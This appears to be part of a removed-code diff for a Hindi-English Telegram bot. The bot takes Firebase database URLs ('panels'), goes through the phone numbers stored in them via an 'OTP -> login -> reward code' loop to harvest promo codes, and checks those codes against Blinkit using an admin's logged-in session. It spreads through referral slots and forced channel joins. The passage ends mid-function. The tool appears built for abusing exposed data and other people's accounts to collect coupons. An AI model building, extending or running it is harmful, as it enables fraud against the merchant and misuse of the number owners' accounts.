-                                    check_line = ""
-                                    try:
-                                        check_status, check_line = check_code_with_blinkit(c)
-                                    except Exception:
-                                        check_line = ""
-                                    msg = (f"🎁 <b>CODE FOUND!</b>\n"
-                                           f"📱 <code>{mobile}</code>\n"
-                                           f"🔑 <code>{html.escape(c)}</code>\n"
-                                           f"📡 <code>{html.escape(panel_url[:50])}</code>")
-                                    if check_line:
-                                        msg += f"\n🛒 <b>Blinkit Check:</b> {check_line}"
-                                    progress(chat_id, msg)
-                                found.extend(new_codes)
-                            else:
-                                status = "Success"
-            except Exception as exc:
-                status = f"Error: {type(exc).__name__}"
-            lines.append(fmt_line(mobile, status, new_codes, dev_id))
-            log_result(user_id, panel_url, dev_id, mobile, status, new_codes)
-            progress(chat_id, _progress_text(label, done, total_nums, lines))
-            time.sleep(NUMBER_DELAY)
-    summary = (
-        f"📊 <b>Panel Done</b>\n<code>{html.escape(label)}</code>\n"
-        f"Processed: {done}/{total_nums} | 🎁 Codes: {len(found)}"
-    )
-    if found:
-        summary += "\n🔑 " + ", ".join(f"<code>{html.escape(c)}</code>" for c in found[:10])
-    summary += "\n\n🏠 menu ke liye /start"
-    progress(chat_id, summary)
-
-
-def run_all(chat_id, user_id):
-    panels = get_user_panels(user_id)
-    if not panels:
-        progress(chat_id, "❌ <b>Koi panel add nahi hai.</b>\n➕ Pehle panel add karo.")
-        return
-    total, used = user_slots(user_id)
-    progress(chat_id, f"🚀 <b>RUNNING {len(panels)} PANELS</b>\nSlots: {slots_display(used, total)}\n\n➡️ Ek ek kar ke...")
-    for i, url in enumerate(panels):
-        process_panel(chat_id, user_id, url)
-        if i < len(panels) - 1:
-            time.sleep(PANEL_DELAY)
-
-
-# ═══════════════════════════════════════════════════════════════
-# HANDLERS
-# ═══════════════════════════════════════════════════════════════
-
-PANEL_URL_RE = re.compile(
-    r"https?://[^\s,\"'<>]+?(?:firebaseio\.com|firebasedatabase\.app)[^\s,\"'<>]*",
-    re.IGNORECASE,
-)
-
-
-def extract_urls(text):
-    urls = []
-    for m in PANEL_URL_RE.finditer(text or ""):
-        url = m.group(0).rstrip(".,;)")
-        if url not in urls:
-            urls.append(url)
-    return urls
-
-
-@BOT.message_handler(commands=["start"])
-def cmd_start(message):
-    chat_id = message.chat.id
-    user_id = message.from_user.id
-    username = message.from_user.username or ""
-    first = message.from_user.first_name or ""
-    ref = None
-    if len(message.text.split()) > 1:
-        ref = message.text.split()[1].strip().upper()
-
-    new = ensure_user(user_id, username, first)
-    if new and ref and ref != get_user(user_id)[3]:
-        referrer = find_user(ref)
-        if referrer and referrer[0] != user_id:
-            if add_referral(referrer[0], user_id):
-                try:
-                    BOT.send_message(
-                        referrer[0],
-                        f"🎉 <b>NEW REFERRAL!</b>\n\n"
-                        f"👤 {html.escape(first or username or 'Someone')} joined via your link!\n"
-                        f"➕ <b>+1 Firebase slot</b> mila hai.\n\n"
-                        f"🧾 Total referrals: <b>{referrer[5] + 1}</b>"
-                        f"{FOOTER}",
-                        parse_mode="HTML",
-                    )
-                except Exception:
-                    pass
-    check_and_reply(chat_id, user_id)
-
-
-@BOT.message_handler(commands=["help"])
-def cmd_help(message):
-    chat_id = message.chat.id
-    user_id = message.from_user.id
-    if not has_joined(user_id) and not is_admin(user_id):
-        send_force_join(chat_id)
-        return
-    BOT.send_message(
-        chat_id,
-        f"{BRAND} - <b>HELP</b>\n\n"
-        f"1️⃣ <b>ADD PANEL</b> ➜ Firebase URL bhejo. Jitne referrals hai utne panels add kar sakte ho.\n"
-        f"2️⃣ <b>RUN CODES</b> ➜ Apne panels ke saare numbers par OTP -> login -> reward code.\n"
-        f"3️⃣ <b>REFER & EARN</b> ➜ 1 referral = 1 extra panel slot. Bulk add allowed.\n"
-        f"4️⃣ <b>MY STATS</b> ➜ Apna poora record.\n\n"
-        f"🔒 Dono channel join karna zaroori hai." + FOOTER,
-        parse_mode="HTML",
-        reply_markup=back_home_markup(),
-    )
-
-
-@BOT.message_handler(content_types=["document"])
-def handle_doc(message):
-    chat_id = message.chat.id
-    user_id = message.from_user.id
-    if not has_joined(user_id) and not is_admin(user_id):
-        send_force_join(chat_id)
-        return
-    doc = message.document
-    if not doc or not (doc.file_name or "").lower().endswith(".txt"):
-        BOT.reply_to(message, "Sirf <b>.txt</b> file bhejo.", parse_mode="HTML")
-        return
-    try:
-        file_info = BOT.get_file(doc.file_id)
-        text = BOT.download_file(file_info.file_path).decode("utf-8", errors="ignore")
-    except Exception as exc:
-        BOT.reply_to(message, f"❌ File read error: {exc}")
-        return
-    urls = extract_urls(text)
-    if not urls:
-        BOT.reply_to(message, "❌ File mein koi Firebase URL nahi mila.", parse_mode="HTML")
-        return
-    check_panels_bulk(chat_id, user_id, urls, "TXT FILE")
-
-
-@BOT.message_handler(func=lambda m: True)
-def handle_text(message):
-    chat_id = message.chat.id
-    user_id = message.from_user.id
-    if not has_joined(user_id) and not is_admin(user_id):
-        send_force_join(chat_id)
-        return
-    if message.text and message.text.startswith("/"):
-        return
-    urls = extract_urls(message.text)
-    if urls:
-        handle_urls(chat_id, user_id, urls)
-    else:
-        BOT.reply_to(message, "❌ Firebase URL nahi mila.\n📂 <b>ADD PANEL</b> dabao ya URL paste karo.",
-                     parse_mode="HTML", reply_markup=home_markup(is_admin(user_id)))
-
-
-def handle_urls(chat_id, user_id, urls):
-    total, used = user_slots(user_id)
-    available = max(0, total - used)
-    if available <= 0:
-        BOT.send_message(
-            chat_id,
-            f"❌ <b>No slots left!</b>\n\n"
-            f"📂 Used: {slots_display(used, total)}\n"
-            f"🔗 <b>REFER & EARN</b> se naye slots pao (1 refer = 1 slot).\n\n"
-            f"Bulk add: jitne referral utne panels ek sath daal sakte ho.",
-            parse_mode="HTML",
-            reply_markup=back_home_markup(),
-        )
-        return
-    added, rejected, avail = add_panels(user_id, urls)
-    reply_add_result(chat_id, user_id, added, rejected)
-
-
-def reply_add_result(chat_id, user_id, added, rejected):
-    total, used = user_slots(user_id)
-    msg = f"✅ <b>PANELS ADDED</b>\n\n"
-    if added:
-        msg += "📂 <b>Added:</b>\n" + "\n".join(
-            f"✅ <code>{html.escape(u[:50])}</code>" for u in added[:10])
-        if len(added) > 10:
-            msg += f"\n... +{len(added) - 10} aur"
-        msg += "\n\n"
-    if rejected:
-        msg += f"❌ <b>Rejected (duplicate/no slot):</b> {len(rejected)}\n"
-    msg += f"📊 Slots: <b>{slots_display(used, total)}</b>\n\n"
-    msg += "🎯 RUN CODES dabao ab!"
-    BOT.send_message(chat_id, msg, parse_mode="HTML",
-                     reply_markup=home_markup(is_admin(user_id)))
-
-
-# ═══════════════════════════════════════════════════════════════
-# CALLBACKS
-# ═══════════════════════════════════════════════════════════════
-
-@BOT.callback_query_handler(func=lambda c: True)
-def handle_callback(call):
-    chat_id = call.message.chat.id
-    user_id = call.from_user.id
-    data = call.data
-    try:
-        BOT.answer_callback_query(call.id)
-    except Exception:
-        pass
-    try:
-        BOT.delete_message(chat_id, call.message.message_id)
-    except Exception:
-        pass
-    try:
-        if data == "check_join":
-            check_and_reply(chat_id, user_id)
-        elif data == "home":
-            send_home(chat_id, user_id)
-        elif data == "add_panel":
-            cb_add_panel(chat_id, user_id)
-        elif data == "check_panels":
-            cb_check_panels(chat_id, user_id)
-        elif data == "check_my_panels":
-            cb_check_my_panels(chat_id, user_id)
-        elif data == "check_txt":
-            cb_check_txt(chat_id, user_id)
-        elif data == "add_active":
-            cb_add_checked(chat_id, user_id, "active")
-        elif data == "add_all_checked":
-            cb_add_checked(chat_id, user_id, "all")
-        elif data == "run_menu":
-            cb_run_menu(chat_id, user_id)
-        elif data == "run_all":
-            cb_run_all(chat_id, user_id)
-        elif data == "my_stats":
-            cb_my_stats(chat_id, user_id)
-        elif data == "refer":
-            cb_refer(chat_id, user_id)
-        elif data == "admin_menu":
-            cb_admin_menu(chat_id, user_id)
-        elif data.startswith("runpanel|"):
-            url = data.split("|", 1)[1]
-            cb_run_panel(chat_id, user_id, url)
-        elif data == "admin_users":
-            cb_admin_users(chat_id, user_id)
-        elif data == "admin_codes":
-            cb_admin_codes(chat_id, user_id)
-        elif data == "admin_top":
-            cb_admin_top(chat_id, user_id)
-        elif data == "admin_access":
-            cb_admin_access(chat_id, user_id)
-        elif data == "blinkit_menu":
-            cb_blinkit_menu(chat_id, user_id)
-        elif data == "blinkit_login":
-            _start_blinkit_login(chat_id)
-    except Exception as exc:
-        try:
-            BOT.send_message(chat_id, f"❌ Error: {exc}", parse_mode="HTML")
-        except Exception:
-            pass
-
-
-def cb_add_panel(chat_id, user_id):
-    total, used = user_slots(user_id)
-    if used >= total:
-        BOT.send_message(
-            chat_id,
-            f"❌ <b>No slots left!</b>\n\n"
-            f"📂 {slots_display(used, total)} slots used.\n"
-            f"🔗 <b>REFER & EARN</b> ➜ 1 referral = 1 panel slot.\n"
-            f"Bulk add possible: jitne referrals utne panels ek sath.",
-            parse_mode="HTML",
-            reply_markup=home_markup(is_admin(user_id)),
-        )
-        return
-    BOT.send_message(
-        chat_id,
-        f"📂 <b>ADD PANEL</b>\n\n"
-        f"Apna Firebase URL bhejo — turant add ho jayega.\n"
-        f"<b>.txt file</b> upload karo to pehle sab URLs check honge (free), phir ADD kar sakte ho.\n\n"
-        f"📊 Current: <b>{slots_display(used, total)}</b> slots\n\n"
-        f"Example:\n<code>https://yourpanel.firebaseio.com</code>",
-        parse_mode="HTML",
-        reply_markup=back_home_markup(),
-    )
-
-
-def cb_check_panels(chat_id, user_id):
-    panels = get_user_panels(user_id)
-    kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(btn(f"📂 MY PANELS ({len(panels)})", "check_my_panels", style="primary", icon=EMO_BLUE))
-    kb.add(btn("📄 CHECK TXT FILE", "check_txt", style="success", icon=EMO_GREEN))
-    kb.add(btn("🏠 HOME", "home", style="danger", icon=EMO_RED))
-    BOT.send_message(
-        chat_id,
-        f"🔎 <b>CHECK PANELS</b>\n\n"
-        f"Sabhi panels check karo — kaun sa <b>ACTIVE</b>, kaun sa <b>INACTIVE</b>.\n"
-        f"✅ <b>Free</b> — koi limit nahi!\n\n"
-        f"📂 Saved panels check karo ya .txt file bhejo (bulk).",
-        parse_mode="HTML",
-        reply_markup=kb,
-    )
-
-
-def cb_check_my_panels(chat_id, user_id):
-    panels = get_user_panels(user_id)
-    if not panels:
-        BOT.send_message(
-            chat_id,
-            f"❌ <b>Koi panel nahi hai.</b>\n\n📂 ADD PANEL se panel add karo ya txt file check karo.",
-            parse_mode="HTML",
-            reply_markup=home_markup(is_admin(user_id)),
-        )
-        return
-    check_panels_bulk(chat_id, user_id, panels, "MY PANELS")
-
-
-def cb_check_txt(chat_id, user_id):
-    BOT.send_message(
-        chat_id,
-        f"📄 <b>CHECK TXT FILE</b>\n\n"
-        f"Apni Firebase URLs wali <b>.txt</b> file bhejo — sab check honge (ACTIVE/INACTIVE).\n"
-        f"✅ <b>Free</b> — koi limit nahi.",
-        parse_mode="HTML",
-        reply_markup=back_home_markup(),
-    )
-
-
-def cb_add_checked(chat_id, user_id, which):
-    cache = _check_cache.pop(user_id, {})
-    urls = cache.get(which, [])
-    if not urls:
-        BOT.send_message(
-            chat_id,
-            f"❌ Koi panel cache nahi hai. Pehle 🔎 CHECK PANELS chalao.",
-            parse_mode="HTML",
-            reply_markup=home_markup(is_admin(user_id)),
-        )
-        return
-    added, rejected, _ = add_panels(user_id, urls)
-    reply_add_result(chat_id, user_id, added, rejected)
-
-
-def cb_run_menu(chat_id, user_id):
-    panels = get_user_panels(user_id)
-    if not panels:
-        BOT.send_message(
-            chat_id,
-            f"❌ <b>Koi panel nahi hai.</b>\n\n📂 ADD PANEL se pehle panel add karo.",
-            parse_mode="HTML",
-            reply_markup=home_markup(is_admin(user_id)),
-        )
-        return
-    if user_id in _processing:
-        BOT.send_message(chat_id, "⏳ Ek job already chal rahi hai. Pehle khatam hone do.",
-                         parse_mode="HTML")
-        return
-    kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(btn(f"🚀 RUN ALL ({len(panels)})", "run_all", style="success", icon=EMO_GREEN))
-    for i, url in enumerate(panels[:12]):
-        tag = url.split("//")[1][:38] if "//" in url else url
-        kb.add(btn(f"📡 {i + 1}. {tag}", f"runpanel|{url}", style="primary", icon=EMO_BLUE))
-    if len(panels) > 12:
-        kb.add(btn(f"➕ +{len(panels) - 12} aur panels", "run_all", style="primary", icon=EMO_BLUE))
-    kb.add(btn("🏠 HOME", "home", style="danger", icon=EMO_RED))
-    BOT.send_message(
-        chat_id,
-        f"🎯 <b>RUN CODES</b>\n\nApne {len(panels)} panels mein se select karo, ya RUN ALL:",
-        parse_mode="HTML",
-        reply_markup=kb,
-    )
-
-
-def cb_run_all(chat_id, user_id):
-    if user_id in _processing:
-        BOT.send_message(chat_id, "⏳ Ek job already chal rahi hai.", parse_mode="HTML")
-        return
-    _processing.add(user_id)
-    try:
-        run_all(chat_id, user_id)
-    except Exception as exc:
-        try:
-            BOT.send_message(chat_id, f"❌ Job error: {exc}", parse_mode="HTML")
-        except Exception:
-            pass
-    finally:
-        _processing.discard(user_id)
-
-
-def cb_run_panel(chat_id, user_id, url):
-    if user_id in _processing:
-        BOT.send_message(chat_id, "⏳ Ek job already chal rahi hai.", parse_mode="HTML")
-        return
-    _processing.add(user_id)
-    try:
-        process_panel(chat_id, user_id, url)
-    except Exception as exc:
-        try:
-            BOT.send_message(chat_id, f"❌ Job error: {exc}", parse_mode="HTML")
-        except Exception:
-            pass
-    finally:
-        _processing.discard(user_id)
-
-
-def cb_my_stats(chat_id, user_id):
-    u = get_user(user_id)
-    if not u:
-        send_home(chat_id, user_id)
-        return
-    total, used = user_slots(user_id)
-    with _db_lock:
-        con = _db()
-        try:
-            rows = con.execute(
-                "SELECT status, COUNT(*) FROM results WHERE user_id=? GROUP BY status", (user_id,)).fetchall()
-            total_codes = u[7]
-        finally:
-            con.close()
-    status_line = " | ".join(f"{s}: {c}" for s, c in rows) or "No runs yet"
-    BOT.send_message(
-        chat_id,
-        f"{BRAND} - <b>MY STATS</b>\n\n"
-        f"👤 Name: <b>{html.escape(u[2] or 'user')}</b>\n"
-        f"🔗 Refer Link: <code>https://t.me/{BOT_USERNAME or 'autoblinkitbot'}?start={u[3]}</code>\n"
-        f"📂 Panels: <b>{slots_display(used, total)}</b>\n"
-        f"👥 Referrals: <b>{u[5]}</b>\n"
-        f"➕ Free slots: <b>{u[6]}</b>\n"
-        f"🎁 Codes found: <b>{total_codes}</b>\n\n"
-        f"📊 Runs: {status_line}" + FOOTER,
-        parse_mode="HTML",
-        reply_markup=home_markup(is_admin(user_id)),
-    )
-
-
-def cb_refer(chat_id, user_id):
-    u = get_user(user_id)
-    if not u:
-        send_home(chat_id, user_id)
-        return
-    code = u[3]
-    link = f"https://t.me/{BOT_USERNAME or 'autoblinkitbot'}?start={code}"
-    total, used = user_slots(user_id)
-    BOT.send_message(
-        chat_id,
-        f"🔗 <b>REFER & EARN</b>\n\n"
-        f"💰 <b>1 referral = 1 Firebase slot</b>\n\n"
-        f"Ye link share karo:\n<code>{link}</code>\n\n"
-        f"📤 Share button se copy karo 👇\n\n"
-        f"👥 Referrals: <b>{u[5]}</b>\n"
-        f"📂 Slots: <b>{slots_display(used, total)}</b>\n"
-        f"🧮 <b>Bulk add:</b> {u[5]} referrals = {u[5]} panels ek sath add kar sakte ho.",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(row_width=1).add(
-            url_btn("📤 SHARE LINK", f"https://t.me/share/url?url={link}&text=🚕%20Join%20VIEDIET%20Panel%20Master%20%E2%80%94%20earn%20free%20codes!",
-                    style="success", icon=EMO_GREEN),
-            btn("🏠 HOME", "home", style="primary", icon=EMO_BLUE),
-        ),
-        disable_web_page_preview=True,
-    )
-
-
-# ═══════════════════════════════════════════════════════════════
-# ADMIN
-# ═══════════════════════════════════════════════════════════════
-
-def admin_markup():
-    kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(btn("👥 ALL USERS", "admin_users", style="primary", icon=EMO_BLUE))
-    kb.add(btn("🎁 TOP CODE HUNTERS", "admin_top", style="primary", icon=EMO_BLUE))
-    kb.add(btn("👑 ADMIN ACCESS", "admin_access", style="success", icon=EMO_GREEN))
-    kb.add(btn("🛒 BLINKIT CHECKER", "blinkit_menu", style="primary", icon=EMO_BLUE))
-    kb.add(btn("🏠 HOME", "home", style="danger", icon=EMO_RED))
-    return kb
-
-
-def cb_admin_menu(chat_id, user_id):
-    if not is_admin(user_id):
-        BOT.send_message(chat_id, "❌ Admin only.", parse_mode="HTML")
-        return
-    users, panels, codes, today = db_stats()
-    BOT.send_message(
-        chat_id,
-        f"🛠 <b>ADMIN PANEL</b>\n\n"
-        f"👥 Total users: <b>{users}</b>\n"
-        f"📂 Total panels: <b>{panels}</b>\n"
-        f"🎁 Total codes: <b>{codes}</b>\n"
-        f"📅 Codes (24h): <b>{today}</b>\n"
-        f"🛒 Blinkit: {blinkit_status_line()}\n\n"
-        f"Commands:\n"
-        f"<code>/user &lt;id|@username&gt;</code> ➜ user stats (counts only)\n"
-        f"<code>/give &lt;user_id&gt; &lt;slots&gt;</code> ➜ free slots do\n"
-        f"<code>/addadmin &lt;user_id&gt;</code> ➜ kisi ko admin access do\n"
-        f"<code>/blinkitlogin</code> ➜ Blinkit login (auto-check)\n"
-        f"<code>/check CODE</code> ➜ manual check",
-        parse_mode="HTML",
-        reply_markup=admin_markup(),
-    )
-
-
-def cb_admin_users(chat_id, user_id):
-    if not is_admin(user_id):
-        return
-    with _db_lock:
-        con = _db()
-        try:
-            rows = con.execute(
-                "SELECT u.user_id, u.username, u.first_name, u.total_codes, u.referrals_count, "
-                "u.free_slots, (SELECT COUNT(*) FROM panels p WHERE p.user_id=u.user_id) as panels, u.created_at"
-                " FROM users u ORDER BY u.created_at DESC LIMIT 25").fetchall()
-        finally:
-            con.close()
-    msg = f"👥 <b>LATEST USERS ({len(rows)})</b>\n\n"
-    for r in rows:
-        uname = f"@{r[1]}" if r[1] else (r[2] or "?")
-        msg += (f"• <b>{html.escape(uname)}</b> | ID <code>{r[0]}</code>\n"
-                f"   📂{r[6]} | 🎁{r[3]} | 👥{r[4]} | ➕{r[5]}\n")
-    msg += f"\nCounts hi dikhte hain — codes/panels sirf user ko."
-    try:
-        BOT.send_message(chat_id, msg[:4000], parse_mode="HTML")
-    except Exception:
-        pass
-    BOT.send_message(chat_id, "🏠 Home?", parse_mode="HTML",
-                     reply_markup=admin_markup())
-
-
-def cb_admin_top(chat_id, user_id):
-    if not is_admin(user_id):
-        return
-    rows = top_users(10)
-    msg = f"🏆 <b>TOP CODE HUNTERS</b>\n\n"
-    for i, r in enumerate(rows, 1):
-        uname = f"@{r[1]}" if r[1] else (r[2] or f"ID {r[0]}")
-        msg += (f"{i}. <b>{html.escape(uname)}</b>\n"
-                f"   🎁 Codes: {r[3]} | 👥 Refer: {r[4]} | ➕ Free: {r[5]}\n")
-    BOT.send_message(chat_id, msg, parse_mode="HTML",
-                     reply_markup=admin_markup())
-
-
-def cb_admin_codes(chat_id, user_id):
-    if not is_admin(user_id):
-        return
-    BOT.send_message(chat_id, "🔒 <b>Codes private hain</b> — har user apne codes "
-                              "sirf khud dekh sakta hai. Admin sirf counts dekhta hai "
-                              "(/user).", parse_mode="HTML")
-
-
-def cb_blinkit_menu(chat_id, user_id):
-    if not is_admin(user_id):
-        return
-    kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(btn("🔑 BLINKIT LOGIN", "blinkit_login"))
-    kb.add(btn("🏠 HOME", "home"))
-    BOT.send_message(
-        chat_id,
-        f"🛒 <b>BLINKIT CHECKER</b>\n\n"
-        f"🔐 Session: {blinkit_status_line()}\n\n"
-        f"📊 Checked: <b>{BLINKIT_STATS['checked']}</b>\n"
-        f"✅ Valid: <b>{BLINKIT_STATS['valid']}</b>\n"
-        f"⚠️ Potential: <b>{BLINKIT_STATS['potential']}</b>\n"
-        f"❌ Invalid: <b>{BLINKIT_STATS['invalid']}</b>\n"
-        f"🔴 Errors: <b>{BLINKIT_STATS['errors']}</b>\n\n"
-        f"Jaise hi kisi user ko code milega, yeh session use hokar "
-        f"<b>auto-check</b> hoga. /check CODE se manual bhi check kar sakte ho.",
-        parse_mode="HTML",
-        reply_markup=kb,
-    )
-
-
-@BOT.message_handler(commands=["user"])
-def admin_user(message):
-    chat_id = message.chat.id
-    if not is_admin(message.from_user.id):
-        return
-    parts = message.text.split()
-    if len(parts) < 2:
-        BOT.send_message(chat_id, "Usage: <code>/user &lt;id|@username&gt;</code>", parse_mode="HTML")
-        return
-    row = find_user(parts[1])
-    if not row:
-        BOT.send_message(chat_id, "❌ User nahi mila.", parse_mode="HTML")
-        return
-    uid = row[0]
-    panels = get_user_panels(uid)
-    with _db_lock:
-        con = _db()
-        try:
-            codes_count = con.execute(
-                "SELECT COUNT(*) FROM results WHERE user_id=? AND codes<>'[]'", (uid,)).fetchone()[0]
-        finally:
-            con.close()
-    msg = (
-        f"👤 <b>USER DETAILS</b>\n\n"
-        f"🆔 ID: <code>{uid}</code>\n"
-        f"👤 Name: <b>{html.escape(row[2] or '')}</b>\n"
-        f"📛 @{row[1] or '-'}\n"
-        f"🎫 Code: <code>{row[3]}</code>\n"
-        f"👥 Referrals: {row[5]} | ➕ Free slots: {row[6]}\n"
-        f"🎁 Codes found: <b>{codes_count}</b>\n"
-        f"📂 Panels added: <b>{len(panels)}</b>\n\n"
-        f"🔒 Codes aur panel URLs private hain — sirf user dekh sakta hai."
-    )
-    BOT.send_message(chat_id, msg, parse_mode="HTML",
-                     reply_markup=admin_markup())
-
-
-@BOT.message_handler(commands=["give"])
-def admin_give(message):
-    chat_id = message.chat.id
-    if not is_admin(message.from_user.id):
-        return
-    parts = message.text.split()
-    if len(parts) < 3 or not parts[1].isdigit() or not parts[2].isdigit():
-        BOT.send_message(chat_id, "Usage: <code>/give &lt;user_id&gt; &lt;slots&gt;</code>", parse_mode="HTML")
-        return
-    uid, n = int(parts[1]), int(parts[2])
-    if not get_user(uid):
-        BOT.send_message(chat_id, "❌ User exist nahi karta.", parse_mode="HTML")
-        return
-    give_slots(uid, n)
-    BOT.send_message(chat_id, f"✅ <b>{n} free slots</b> user <code>{uid}</code> ko de diye.",
-                     parse_mode="HTML", reply_markup=admin_markup())
-    try:
-        BOT.send_message(uid, f"🎁 <b>+{n} FREE SLOTS!</b>\n\n"
-                              f"Admin ne aapko {n} extra panel slots diye. 🎉\n"
-                              f"Ab aur panels add karo!" + FOOTER, parse_mode="HTML")
-    except Exception:
-        pass
-
-
-def cb_admin_access(chat_id, user_id):
-    if not is_admin(user_id):
-        return
-    db_admins = list_admins()
-    msg = f"👑 <b>ADMIN ACCESS</b>\n\n"
-    msg += f"Yahan se kisi ko bhi <b>admin access</b> de sakte ho bot se hi:\n\n"
-    msg += f"<code>/addadmin &lt;user_id&gt;</code> ➜ admin banao\n"
-    msg += f"<code>/deladmin &lt;user_id&gt;</code> ➜ admin hatao\n\n"
-    msg += f"👑 DB admins ({len(db_admins)}):\n"
-    for a in db_admins[:20]:
-        msg += f"  • <code>{a}</code>\n"
-    if not db_admins:
-        msg += "  (koi nahi)\n"
-    msg += f"\n⚙️ Owner/ENV admins: {', '.join(str(a) for a in ADMIN_IDS)}"
-    BOT.send_message(chat_id, msg, parse_mode="HTML",
-                     reply_markup=admin_markup())
-
-
-@BOT.message_handler(commands=["addadmin"])
-def admin_add_admin(message):
-    chat_id = message.chat.id
-    if not is_admin(message.from_user.id):
-        return
-    parts = message.text.split()
-    if len(parts) < 2 or not parts[1].lstrip("+-").isdigit():
-        BOT.send_message(chat_id, "Usage: <code>/addadmin &lt;user_id&gt;</code>", parse_mode="HTML")
-        return
-    uid = int(parts[1])
-    add_admin(uid, message.from_user.id)
-    BOT.send_message(chat_id, f"✅ <b>Admin added:</b> <code>{uid}</code>\n"
-                              f"Ab isko full access hai.", parse_mode="HTML",
-                     reply_markup=admin_markup())
-    try:
-        BOT.send_message(uid, f"👑 <b>ADMIN ACCESS MILA!</b>\n\n"
-                              f"Aapko bot ka <b>full admin access</b> de diya gaya hai. 🎉\n"
-                              f"🛠 ADMIN PANEL ab aapko home menu me dikhega." + FOOTER,
-                         parse_mode="HTML")
-    except Exception:
-        pass
-
-
-@BOT.message_handler(commands=["deladmin"])
-def admin_del_admin(message):
-    chat_id = message.chat.id
-    if not is_admin(message.from_user.id):
-        return
-    parts = message.text.split()
-    if len(parts) < 2 or not parts[1].lstrip("+-").isdigit():
-        BOT.send_message(chat_id, "Usage: <code>/deladmin &lt;user_id&gt;</code>", parse_mode="HTML")
-        return
-    uid = int(parts[1])
-    if uid in ADMIN_IDS:
-        BOT.send_message(chat_id, f"❌ <code>{uid}</code> owner/ENV admin hai — hata nahi sakte.",
-                         parse_mode="HTML", reply_markup=admin_markup())
-        return
-    remove_admin(uid)
-    BOT.send_message(chat_id, f"✅ <b>Admin removed:</b> <code>{uid}</code>", parse_mode="HTML",
-                     reply_markup=admin_markup())
-
-
-# ═══════════════════════════════════════════════════════════════
-# BLINKIT LOGIN + MANUAL CHECK  (admin only)
-# ═══════════════════════════════════════════════════════════════
-
-_blinkit_login_state = {}
-
-
-def blinkit_status_line():
-    if not CFFI_OK:
-        return "🔴 curl_cffi missing (pip install curl_cffi)"
-    if blinkit_logged_in():
-        s = _blinkit_session()
-        return f"🟢 Logged in as <code>{s.get('phone', '?')}</code>"
-    return "🔴 Not logged in - /blinkitlogin"
-
-
-@BOT.message_handler(commands=["blinkitlogin"])
-def admin_blinkit_login(message):
-    if not is_admin(message.from_user.id):
-        return
-    _start_blinkit_login(message.chat.id)
-
-
-def _start_blinkit_login(chat_id):
-    if not CFFI_OK:
-        BOT.send_message(chat_id, "❌ <b>curl_cffi</b> install nahi hai.\nRun: <code>pip install curl_cffi</code>",
-                         parse_mode="HTML")
-        return
-    if blinkit_logged_in():
-        s = _blinkit_session()
-        BOT.send_message(
-            chat_id,
-            f"🟢 <b>Already logged in</b> as <code>{s.get('phone', '?')}</code>\n"
-            f"Re-login karna hai to bhi apna 10-digit number bhejo:",
-            parse_mode="HTML",
-        )
-    else:
-        BOT.send_message(chat_id, "📱 Apna <b>10-digit Blinkit number</b> bhejo:", parse_mode="HTML")
-    _blinkit_login_state[chat_id] = {"step": "phone"}
-    BOT.register_next_step_handler_by_chat_id(chat_id, _blinkit_phone_step)
-
-
-def _blinkit_phone_step(message):
-    chat_id = message.chat.id
-    if not is_admin(message.from_user.id):
-        return
-    phone = (message.text or "").strip()
-    if len(phone) != 10 or not phone.isdigit():
-        BOT.send_message(chat_id, "❌ Invalid number! 10 digit hona chahiye.")
-        return
-    BOT.send_message(chat_id, "⏳ Blinkit OTP bhej raha hu...")
-    ok, msg = blinkit_request_otp(phone)
-    if not ok:
-        BOT.send_message(chat_id, f"❌ OTP fail: {msg}", parse_mode="HTML")
-        _blinkit_login_state.pop(chat_id, None)
-        return
-    _blinkit_login_state[chat_id] = {"step": "otp", "phone": phone}
-    BOT.send_message(chat_id, "📩 OTP bhej diya! Ab <b>OTP</b> bhejo:", parse_mode="HTML")
-    BOT.register_next_step_handler_by_chat_id(chat_id, _blinkit_otp_step)
-
-
-def _blinkit_otp_step(message):
-    chat_id = message.chat.id
-    if not is_admin(message.from_user.id):
-        return
-    state = _blinkit_login_state.get(chat_id, {})
-    phone = state.get("phone")
-    otp = (message.text or "").strip()
-    if not phone:
-        BOT.send_message(chat_id, "⚠️ Session expire. /blinkitlogin phir se.")
-        return
-    BOT.send_message(chat_id, "🔄 OTP verify ho raha hai...")
-    token, msg = blinkit_verify_otp(phone, otp)
-    if not token:
-        BOT.send_message(chat_id, f"❌ OTP verify fail: {msg}", parse_mode="HTML")
-        _blinkit_login_state.pop(chat_id, None)
-        return
-    BOT.send_message(chat_id, "✅ Login done! Cart setup ho raha hai...")
-    cart_id, addr_id = blinkit_get_active_cart(token)
-    if not (cart_id and addr_id):
-        BOT.send_message(
-            chat_id,
-            "⚠️ Login ho gaya lekin <b>Cart setup fail</b>.\n"
-            "Blinkit app mein ek item cart mein daalo, phir /blinkitlogin repeat karo.",
-            parse_mode="HTML",
-        )
-        _blinkit_login_state.pop(chat_id, None)
-        return
-    session = {
-        "access_token": token,
-        "cart_id": cart_id,
-        "channel_address_id": int(addr_id),
-        "phone": phone,
-        "base_payload": {
-            "cart_type": "product",
-            "channel_address_id": int(addr_id),
-            "promo_codes": [],
-            "items": [{
-                "group_id": 1914948, "inventory": 15, "merchant_id": 36349,
-                "merchant_type": "express", "mrp": 195.0, "price": 195.0,
-                "product_id": "438914", "quantity": 1,
-            }],
-        },
-    }
-    _blinkit_save_session(session)
-    try:
-        _cffi_session.patch(f"{BLINKIT_BASE_URL}/v5/carts/{cart_id}",
-                            json=session["base_payload"],
-                            headers=_blinkit_headers(token, fixed_device=True), timeout=10)
-    except Exception:
-        pass
-    _blinkit_login_state.pop(chat_id, None)
-    BOT.send_message(
-        chat_id,
-        f"✅ <b>BLINKIT LOGIN SUCCESSFUL!</b>\n\n"
-        f"📱 Phone: <code>{phone}</code>\n"
-        f"🛒 Cart: Ready\n\n"
-        f"Ab jaise hi koi user ko code milega, woh isi session se <b>auto-check</b> hoga "
-        f"(✅ valid / ❌ invalid / ⚠️ potential) aur turant dikhega." + FOOTER,
-        parse_mode="HTML",
-    )
-
-
-@BOT.message_handler(commands=["check"])
-def admin_check(message):
-    chat_id = message.chat.id
-    if not is_admin(message.from_user.id):
-        return
-    parts = message.text.split(maxsplit=1)
-    if len(parts) < 2:
-        BOT.send_message(chat_id, "Usage: <code>/check COUPONCODE</code>", parse_mode="HTML")
-        return
-    code = parts[1].strip().upper()
-    if not blinkit_logged_in():
